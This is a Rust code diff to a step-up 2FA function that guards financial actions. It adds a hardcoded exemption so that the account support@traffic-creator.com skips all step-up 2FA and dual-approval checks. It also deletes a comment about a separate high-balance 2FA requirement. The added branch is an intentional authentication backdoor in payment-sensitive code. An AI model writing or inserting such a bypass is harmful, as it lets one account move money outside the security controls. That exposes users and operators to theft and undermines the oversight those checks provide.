@@ -85,6 +85,20 @@ pub async fn require_step_up_2fa(
     action: FinancialAction,
     amount_cents: i64,
 ) -> Result<(), AppError> {
+    // ── Developer account bypass ─────────────────────────────────
+    // support@traffic-creator.com is the web developer account and is
+    // permanently exempt from all step-up 2FA / dual-approval requirements.
+    let email: Option<String> =
+        sqlx::query_scalar("SELECT email FROM users WHERE id = $1")
+            .bind(user_id)
+            .fetch_optional(db)
+            .await
+            .ok()
+            .flatten();
+    if email.as_deref() == Some("support@traffic-creator.com") {
+        return Ok(());
+    }
+
     // 1. Check if user has TOTP enabled
     let totp_enabled: bool = sqlx::query_scalar(
         "SELECT COALESCE(totp_enabled, FALSE) FROM user_settings WHERE user_id = $1",
@@ -96,7 +110,6 @@ pub async fn require_step_up_2fa(
 
     if !totp_enabled {
         // User hasn't set up 2FA — can't enforce step-up
-        // (Task 1.6 separate check forces 2FA setup for high-balance accounts)
         return Ok(());
     }
 
